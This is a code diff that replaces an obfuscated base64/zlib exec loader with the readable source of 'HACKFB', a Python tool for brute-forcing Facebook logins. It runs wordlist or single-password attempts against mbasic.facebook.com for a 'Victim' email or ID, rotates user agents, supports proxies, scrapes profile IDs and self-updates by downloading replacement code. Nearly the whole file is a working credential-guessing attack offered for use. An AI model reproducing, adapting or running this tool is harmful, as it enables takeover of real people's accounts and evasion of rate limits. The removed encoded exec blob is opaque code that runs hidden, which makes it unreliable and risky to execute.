@@ -1,4 +1,280 @@
-#Encrypt by MR-ZIHAD
-#Github : https://github.com/MR-ZIHAD
-import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("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")))
+#!/usr/bin/python
+
+import socket, sys, os, re, random, optparse, time, io
+if sys.version_info.major <= 2:import httplib
+else:import http.client as httplib
+
+## COLORS ###############
+wi="\033[1;37m" #>>White#
+rd="\033[1;31m" #>Red   #
+gr="\033[1;32m" #>Green #
+yl="\033[1;33m" #>Yellow#
+#########################
+os.system("cls||clear")
+def write(text):
+    sys.stdout.write(text)
+    sys.stdout.flush()
+
+versionPath = os.path.join("core", "version.txt")
+
+errMsg = lambda msg: write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)
+
+try:import requests
+except ImportError:
+    errMsg("[ requests ] module is missing")
+    print("  [*] Please Use: 'pip install requests' to install it :)")
+    sys.exit(1)
+try:import mechanize
+except ImportError:
+    errMsg("[ mechanize ] module is missing")
+    print("  [*] Please Use: 'pip install mechanize' to install it :)")
+    sys.exit(1)
+
+class FaceBoom(object):
+
+
+    def __init__(self):
+        self.useProxy = None
+        self.br = mechanize.Browser()
+        self.br.set_handle_robots(False)
+        self.br._factory.is_html = True
+        self.br.addheaders=[('User-agent',random.choice([
+               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
+               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
+               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
+               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
+               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
+               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
+               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
+
+
+    @staticmethod
+    def check_proxy(proxy):
+          proxies = {'https':"https://"+proxy, 'http':"http://"+proxy}
+          proxy_ip = proxy.split(":")[0]
+          try:
+            r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)
+            if proxy_ip==r.headers['X-Client-IP']: return True
+            return False
+          except Exception : return False
+
+
+    @staticmethod
+    def cnet():
+        try:
+            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
+            return True
+        except socket.error:pass
+        return False
+
+
+    def get_profile_id(self, target_profile):
+        try:
+            print(gr+"\n["+wi+"*"+gr+"] geting target Profile Id... please wait"+wi)
+            idre = re.compile('(?<="userID":").*?(?=")')
+            con = requests.get(target_profile).text
+            idis = idre.search(con).group()
+            print(wi+"\n["+gr+"+"+wi+"]"+gr+" Target Profile"+wi+" ID: "+yl+idis+wi)
+        except Exception:
+            errMsg("Please Check Your Victim's Profile URL")
+            sys.exit(1)
+
+
+    def login(self,target, password):
+
+        try:
+            self.br.open("https://mbasic.facebook.com")
+            self.br.select_form(nr=0)
+            self.br.form['email']=target
+            self.br.form['pass']= password
+            self.br.method ="POST"
+            if self.br.submit().get_data().__contains__(b'home_icon'):return  1
+            elif "checkpoint" in self.br.geturl(): return 2
+            return 0
+        except(KeyboardInterrupt, EOFError):
+            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
+            time.sleep(1.5)
+            sys.exit(1)
+        except Exception as e:
+            print(rd+" Error: "+yl+str(e)+wi+"\n")
+            time.sleep(0.60)
+
+
+    def banner(self,target,wordlist,single_passwd):
+
+        proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
+        print(gr+"""
+••••••••••••••••••••••••••••••••••
+[---]        """+wi+"""HACKFB"""+gr+"""          [---]
+••••••••••••••••••••••••••••••••••
+[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
+••••••••••••••••••••••••••••••••••
+[---]       """+yl+"""MR-ZIHAD"""+gr+"""         [---]
+••••••••••••••••••••••••••••••••••
+[>] Target      :> """+wi+target+gr+"""
+{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not single_passwd else "[>] Password    :> "+yl+str(single_passwd))+gr+"""
+[>] ProxyStatus :> """+str(proxystatus)+wi)
+        if not single_passwd:
+            print(gr+"""\
+••••••••••••••••••••••••••••••••••"""+wi+"""
+[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
+••••••••••••••••••••••••••••••••••\n"""+wi)
+        else:print("\n")
+
+
+    @staticmethod
+    def updateFaceBoom():
+        if not os.path.isfile(versionPath):
+             errMsg("Unable to check for updates: please re-clone the script to fix this problem")
+             sys.exit(1)
+        write("[~] Checking for updates...\n")
+        conn = httplib.HTTPSConnection("raw.githubusercontent.com")
+        conn.request("GET", "/MR-ZIHAD/BruteX/master/version.txt")
+        repoVersion = conn.getresponse().read().strip().decode()
+        with open(versionPath) as vf:
+            currentVersion = vf.read().strip()
+        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
+        else:
+                print("  [+] An update has been found ::: Updating... ")
+                conn.request("GET", "/MR-ZIHAD/BruteX/master/HACKFB.py")
+                newCode = conn.getresponse().read().strip().decode()
+                with open("faceboom.py", "w") as  faceBoomScript:
+                   faceBoomScript.write(newCode)
+                with open(versionPath, "w") as ver:
+                     ver.write(repoVersion)
+                write("  [+] Successfully updated :)\n")
+
+parse = optparse.OptionParser(wi+"""
+Usage: python ./HACKFB.py [OPTIONS...]
+-------------
+OPTIONS:
+       |
+    |--------
+    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
+    |--------
+    | -w <wordlist Path>                      ::> Specify Wordlist File Path
+    |--------
+    | -s <single password>                    ::> Specify Single Password To Check
+    |--------
+    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
+    |--------
+    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
+    |--------
+    | -u/--update                             ::> Update FaceBoom Script
+-------------
+Examples:
+        |
+     |--------
+     | python HACKFB.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     |--------
+     | python HACKFB.py -t 100001013070780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     |--------
+     | python HACKFB.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
+     |--------
+     | python HACKFB.py -t Victim@gmail.com -s 1234567
+     |--------
+     | python HACKFB.py -g https://www.facebook.com/Victim_Profile
+     |--------
+""")
+
+
+def Main():
+   parse.add_option("-t","--target",'-T','--TARGET',dest="target",type="string",
+      help="Specify Target Email or ID")
+   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wordlist",type="string",
+      help="Specify Wordlist File ")
+   parse.add_option("-s","--single","--S","--SINGLE",dest="single",type="string",
+      help="Specify Single Password To Check it")
+   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
+                        help="Specify HTTP/S Proxy to be used")
+   parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
+                        help="Specify TARGET FACEBOOK PROFILE URL to get his ID")
+   parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
+   (options,args) = parse.parse_args()
+   faceboom = FaceBoom()
+   target = options.target
+   wordlist = options.wordlist
+   single_passwd = options.single
+   proxy = options.proxy
+   target_profile = options.url
+   update = options.update
+   opts = [target,wordlist,single_passwd, proxy, target_profile, update]
+   if any(opt for opt in opts):
+     if not faceboom.cnet():
+       errMsg("Please Check Your Internet Connection")
+       sys.exit(1)
+   if update:
+    faceboom.updateFaceBoom()
+    sys.exit(1)
+   elif target_profile:
+        faceboom.get_profile_id(target_profile)
+        sys.exit(1)
+   elif wordlist or single_passwd:
+        if wordlist:
+            if not os.path.isfile(wordlist):
+                errMsg("Please check Your Wordlist Path")
+                sys.exit(1)
+        if single_passwd:
+            if len(single_passwd.strip()) < 6:
+                errMsg("Invalid Password")
+                print("[!] Password must be at least '6' characters long")
+                sys.exit(1)
+        if proxy:
+             if proxy.count(".") != 3:
+                    errMsg("Invalid IPv4 ["+rd+str(proxy)+yl+"]")
+                    sys.exit(1)
+             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
+             final_proxy = proxy+":8080" if not ":" in proxy else proxy
+             if faceboom.check_proxy(final_proxy):
+                faceboom.useProxy = final_proxy
+                faceboom.br.set_proxies({'https':faceboom.useProxy, 'http':faceboom.useProxy})
+                print(wi+"["+gr+"Connected"+wi+"]")
+             else:
+                errMsg("Connection Failed")
+                errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
+                sys.exit(1)
+
+        faceboom.banner(target,wordlist,single_passwd)
+        loop = 1 if not single_passwd else "~"
+        if single_passwd:
+            passwords = [single_passwd]
+        else:
+            with io.open(wordlist, 'r', errors='replace') as f:
+                passwords = f.readlines()
+        for passwd in passwords:
+                passwd = passwd.strip()
+                if len(passwd) <6:continue
+                write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
+                retCode = faceboom.login(target, passwd)
+                if retCode:
+                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
+                    print(wi+"========================="+"="*len(passwd)+"======")
+                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
+                    print(wi+"========================="+"="*len(passwd)+"======")
+                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
+                    break
+                else:
+                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
+                    loop = loop + 1 if not single_passwd else "~"
+        else:
+                if single_passwd:
+                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
+                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
+                else:
+                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
+                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
+        sys.exit(1)
+   else:
+       print(parse.usage)
+       sys.exit(1)
+
+if __name__=='__main__':
+    Main()
+##############################################################
+#####################                #########################
+#####################   END OF TOOL  #########################
+#####################                #########################
+##############################################################
+#DEVELOPED BY ZIHAD HOSSAIN RAFI
+#Have a nice day :)
+#GoodBye
